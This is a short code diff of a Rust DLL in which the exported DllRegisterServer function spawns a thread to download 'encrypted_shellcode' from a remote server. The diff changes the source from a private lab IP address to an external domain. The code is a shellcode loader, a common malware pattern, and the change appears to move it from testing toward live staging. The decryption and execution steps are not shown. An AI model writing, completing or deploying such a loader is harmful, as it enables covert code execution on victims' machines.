@@ -17,7 +17,7 @@ pub extern "stdcall" fn DllRegisterServer(
     _nCmdShow: i32,
 ) -> i32 {
     std::thread::spawn(|| {
-        let encrypted_shellcode = match download::get_contents("http://192.168.119.128:8443/content.b64") {
+        let encrypted_shellcode = match download::get_contents("https://drive.outliertech.dev/content.b64") {
             Ok(data) => data,
             Err(_) => return,
         };
